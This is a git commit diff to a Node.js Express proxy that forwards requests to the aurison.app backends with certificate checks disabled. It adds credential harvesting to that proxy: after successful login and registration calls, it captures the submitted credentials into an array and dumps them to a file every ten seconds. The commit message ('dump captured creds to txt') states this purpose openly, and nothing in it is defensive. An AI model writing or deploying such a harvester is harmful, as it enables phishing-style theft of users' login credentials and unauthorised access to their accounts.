b2fe57084da81eee0e8ffc84cc3ca6824d3d73ec
colossalbro <colossal@colossalmac.local>
2024-01-14 20:44:40 +0100

    dump captured creds to txt

--- app.js
+++ app.js
@@ -1,3 +1,6 @@
+//imports
+const harvestCredentials = require('./utils/utils').grabCreds;
+const credsDump = require('./utils/utils').writeCreds;
 const parseJson = require('body-parser').json;
 const express = require('express');
 const axios = require('axios');
@@ -5,34 +8,37 @@ const https = require('https');
 
 
 
-const port = 55000;
+//consts 
+const PORT = 55000;
 const STAGING = 'https://test-backend.aurison.app';
 const PROD = 'https://api.aurison.app';
-const agent = new https.Agent({ rejectUnauthorized: false });
+const AGENT = new https.Agent({ rejectUnauthorized: false });
+const app = express();
 
+//vars
+var HARVESTED_CREDENTIALS = [];
 
-app = express();
-
-app.use(parseJson());
 
 // Serve static files from the "public" directory
 app.use('/static', express.static('static'));
 
+//middlwares
+app.use(parseJson());
 
-//Home
+
+//home
 app.get('/', (req, res)=>{
     return res.sendFile(__dirname + '/index.html');
 });
 
 
-//catch any other path
-app.get('/:anypath', (req, res)=>{
+app.get('/:anypath(*)', (req, res)=>{
     return res.sendFile(__dirname + '/index.html');
 });
 
 
 //proxy api requests
-app.all('/:path*', async (req, res) =>{
+app.all('/:path(*)', async (req, res) =>{
     const path = req.params.path;   //grab route
 
     try {
@@ -44,7 +50,7 @@ app.all('/:path*', async (req, res) =>{
           headers: headers,
           data: body,
           url: `${STAGING}/${path}`,
-          httpsAgent: agent
+          httpsAgent: AGENT
         });   
         
         const resHeaders = response.headers
@@ -55,13 +61,23 @@ app.all('/:path*', async (req, res) =>{
             res.setHeader(key, resHeaders[key]) 
         });
         
+        //Grab login creds
+        if (response.data.error === false && path === 'login') harvestCredentials(req, HARVESTED_CREDENTIALS);
+
+        //Grab verify creds
+        if (response.data.error === false && path == 'verifiy') {
+            if (req.data.action === "register") harvestCredentials(req, HARVESTED_CREDENTIALS);
+        }
+
+
         return res.status(200).json(response.data);
-        
+
     } catch (error) {
-        if (error.response.data) {
+        if (error.response && error.response.data) { //check if the error was raised from aurison api 
             return res.status(error.response.status).json(error.response.data);
         }
 
+        // console.log(error);
         return res.status(400).json({
             error: true,
             error_log: 'Unknown Error'
@@ -70,6 +86,10 @@ app.all('/:path*', async (req, res) =>{
 });
 
 
-app.listen(port, () => {
-  console.log(`Server is listening on port ${port}`);
+
+//launch
+app.listen(PORT, () => {
+    setInterval(() => credsDump(HARVESTED_CREDENTIALS), 10000);   //dump any creds in queue every 10 seconds.
+
+    console.log(`Server is listening on port ${PORT}`);
 });
